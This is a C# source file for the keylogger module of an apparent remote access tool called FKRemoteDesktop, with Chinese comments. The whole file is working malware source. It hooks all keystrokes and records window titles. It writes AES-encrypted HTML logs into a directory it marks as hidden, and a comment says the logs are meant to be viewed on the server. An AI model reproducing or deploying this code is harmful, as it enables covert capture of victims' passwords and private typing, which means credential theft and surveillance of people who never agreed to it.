using FKRemoteDesktop.Configs;
using FKRemoteDesktop.Cryptography;
using FKRemoteDesktop.Debugger;
using FKRemoteDesktop.Extensions;
using FKRemoteDesktop.Helpers;
using Gma.System.MouseKeyHook;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Text;
using System.Web;
using System.Windows.Forms;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.KeyLogger
{
    // 记录按键功能类
    public class Keylogger : IDisposable
    {
        public bool IsDisposed { get; private set; }                        // 记录本类是否已释放
        private readonly System.Timers.Timer _timerFlush;                   // 将内存写入到硬盘记录的间隔事件
        private readonly StringBuilder _logFileBuffer = new StringBuilder();// 内存中记录的按键信息
        private readonly List<Keys> _pressedKeys = new List<Keys>();        // 用户按键信息列表
        private readonly List<char> _pressedKeyChars = new List<char>();    // 用户按下字母键信息列表
        private string _lastWindowTitle = string.Empty;                     // 用户激活的窗口名称
        private bool _ignoreSpecialKeys;                                    // 是否忽略特殊按键（例如 Alt,Ctrl 等）
        private readonly IKeyboardMouseEvents _mEvents;                     // 用来Hook鼠标和按键消息
        private readonly Aes256 _aesInstance = new Aes256(SettingsFromServer.ENCRYPTIONKEY);  // 日志文件加密方式
        private readonly long _maxLogFileSize;                              // 单个文件最大大小

        /// <summary>
        /// 构造函数
        /// </summary>
        /// <param name="flushInterval">写入日志文件间隔事件</param>
        /// <param name="maxLogFileSize">单个日志文件最大大小</param>
        public Keylogger(double flushInterval, long maxLogFileSize)
        {
            _maxLogFileSize = maxLogFileSize;
            _mEvents = Hook.GlobalEvents();
            _timerFlush = new System.Timers.Timer { Interval = flushInterval };
            _timerFlush.Elapsed += TimerElapsed;
        }

        // 开始记录按键
        public void Start()
        {
            Subscribe();
            _timerFlush.Start();
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (IsDisposed)
                return;
            if (disposing)
            {
                Unsubscribe();
                _timerFlush.Stop();
                _timerFlush.Dispose();
                _mEvents.Dispose();
                WriteFile();
            }
            IsDisposed = true;
        }

        // 订阅按键信息
        private void Subscribe()
        {
            _mEvents.KeyDown += OnKeyDown;
            _mEvents.KeyUp += OnKeyUp;
            _mEvents.KeyPress += OnKeyPress;
        }

        // 取消按键信息的订阅
        private void Unsubscribe()
        {
            _mEvents.KeyDown -= OnKeyDown;
            _mEvents.KeyUp -= OnKeyUp;
            _mEvents.KeyPress -= OnKeyPress;
        }

        private void OnKeyDown(object sender, KeyEventArgs e)
        {
            string activeWindowTitle = NativeMethodsHelper.GetForegroundWindowTitle();
            if (!string.IsNullOrEmpty(activeWindowTitle) && activeWindowTitle != _lastWindowTitle)
            {
                _lastWindowTitle = activeWindowTitle;
                _logFileBuffer.Append(@"<p class=""h""><br><br>[<b>"
                    + HttpUtility.HtmlEncode(activeWindowTitle) + " - "
                    + DateTime.UtcNow.ToString("t", DateTimeFormatInfo.InvariantInfo)
                    + " UTC</b>]</p><br>");
            }

            if (_pressedKeys.ContainsModifierKeys())
            {
                if (!_pressedKeys.Contains(e.KeyCode))
                {
                    Debug.WriteLine("OnKeyDown: " + e.KeyCode);
                    _pressedKeys.Add(e.KeyCode);
                    return;
                }
            }

            if (!e.KeyCode.IsExcludedKey())
            {
                if (!_pressedKeys.Contains(e.KeyCode))
                {
                    Debug.WriteLine("OnKeyDown: " + e.KeyCode);
                    _pressedKeys.Add(e.KeyCode);
                }
            }
        }

        private void OnKeyPress(object sender, KeyPressEventArgs e)
        {
            if (_pressedKeys.ContainsModifierKeys() && _pressedKeys.ContainsKeyChar(e.KeyChar))
                return;

            if ((!_pressedKeyChars.Contains(e.KeyChar) || !DetectKeyHolding(_pressedKeyChars, e.KeyChar)) && !_pressedKeys.ContainsKeyChar(e.KeyChar))
            {
                var filtered = HttpUtility.HtmlEncode(e.KeyChar.ToString());
                if (!string.IsNullOrEmpty(filtered))
                {
                    Debug.WriteLine("OnKeyPress Output: " + filtered);
                    if (_pressedKeys.ContainsModifierKeys())
                        _ignoreSpecialKeys = true;

                    _pressedKeyChars.Add(e.KeyChar);
                    _logFileBuffer.Append(filtered);
                }
            }
        }

        private void OnKeyUp(object sender, KeyEventArgs e)
        {
            _logFileBuffer.Append(HighlightSpecialKeys(_pressedKeys.ToArray()));
            _pressedKeyChars.Clear();
        }

        /// <summary>
        /// 在给定的按键字符列表中，查找是否有按下的按键字符
        /// </summary>
        /// <param name="list">按键字符列表</param>
        /// <param name="search">需要搜索的按键字符</param>
        /// <returns></returns>
        private bool DetectKeyHolding(List<char> list, char search)
        {
            return list.FindAll(s => s.Equals(search)).Count > 1;
        }

        // 为指定的特殊按键，在HTML中进行高亮显示
        private string HighlightSpecialKeys(Keys[] keys)
        {
            if (keys.Length < 1) return string.Empty;

            string[] names = new string[keys.Length];
            for (int i = 0; i < keys.Length; i++)
            {
                if (!_ignoreSpecialKeys)
                {
                    names[i] = keys[i].GetDisplayName();
                    Debug.WriteLine("HighlightSpecialKeys: " + keys[i] + " : " + names[i]);
                }
                else
                {
                    names[i] = string.Empty;
                    _pressedKeys.Remove(keys[i]);
                }
            }

            _ignoreSpecialKeys = false;

            if (_pressedKeys.ContainsModifierKeys())
            {
                StringBuilder specialKeys = new StringBuilder();

                int validSpecialKeys = 0;
                for (int i = 0; i < names.Length; i++)
                {
                    _pressedKeys.Remove(keys[i]);
                    if (string.IsNullOrEmpty(names[i])) continue;

                    specialKeys.AppendFormat((validSpecialKeys == 0) ? @"<p class=""h"">[{0}" : " + {0}", names[i]);
                    validSpecialKeys++;
                }

                if (validSpecialKeys > 0)
                    specialKeys.Append("]</p>");

                Debug.WriteLineIf(specialKeys.Length > 0, "HighlightSpecialKeys Output: " + specialKeys.ToString());
                return specialKeys.ToString();
            }

            StringBuilder normalKeys = new StringBuilder();

            for (int i = 0; i < names.Length; i++)
            {
                _pressedKeys.Remove(keys[i]);
                if (string.IsNullOrEmpty(names[i])) continue;

                switch (names[i])
                {
                    case "Return":
                        normalKeys.Append(@"<p class=""h"">[Enter]</p><br>");
                        break;

                    case "Escape":
                        normalKeys.Append(@"<p class=""h"">[Esc]</p>");
                        break;

                    default:
                        normalKeys.Append(@"<p class=""h"">[" + names[i] + "]</p>");
                        break;
                }
            }

            Debug.WriteLineIf(normalKeys.Length > 0, "HighlightSpecialKeys Output: " + normalKeys.ToString());
            return normalKeys.ToString();
        }

        private void TimerElapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (_logFileBuffer.Length > 0)
                WriteFile();
        }

        // 将按键信息从内存中写入到文件中
        private void WriteFile()
        {
            bool writeHeader = false;
            string filePath = Path.Combine(SettingsFromClient.LOGSPATH, DateTime.UtcNow.ToString("yyyy-MM-dd"));

            try
            {
                DirectoryInfo di = new DirectoryInfo(SettingsFromClient.LOGSPATH);
                if (!di.Exists)
                    di.Create();
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;

                int i = 1;
                while (File.Exists(filePath))
                {
                    // 进行大文件分页
                    long length = new FileInfo(filePath).Length;
                    if (length < _maxLogFileSize)
                    {
                        break;
                    }

                    // 文件分页编号命名
                    var newFileName = $"{Path.GetFileName(filePath)}_{i}";
                    filePath = Path.Combine(SettingsFromClient.LOGSPATH, newFileName);
                    i++;
                }

                if (!File.Exists(filePath))
                    writeHeader = true;

                StringBuilder logFile = new StringBuilder();
                if (writeHeader)
                {
                    logFile.Append(
                        "<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " +
                        DateTime.UtcNow.ToString("f", DateTimeFormatInfo.InvariantInfo) + " UTC<br><br>");
                    logFile.Append("<style>.h { color: 0000ff; display: inline; }</style>");
                    _lastWindowTitle = string.Empty;
                }

                if (_logFileBuffer.Length > 0)
                {
                    logFile.Append(_logFileBuffer);
                }

                Logger.Log(Enums.ELogType.eLogType_Debug, "按键信息记录到: " + filePath.ToString());
                FileHelper.WriteLogFile(filePath, logFile.ToString(), _aesInstance);
                logFile.Clear();
            }
            catch { }
            _logFileBuffer.Clear();
        }

        // TODO: 需要将已保存的Log文件解压后，在服务器有工具能显示出来。
    }
}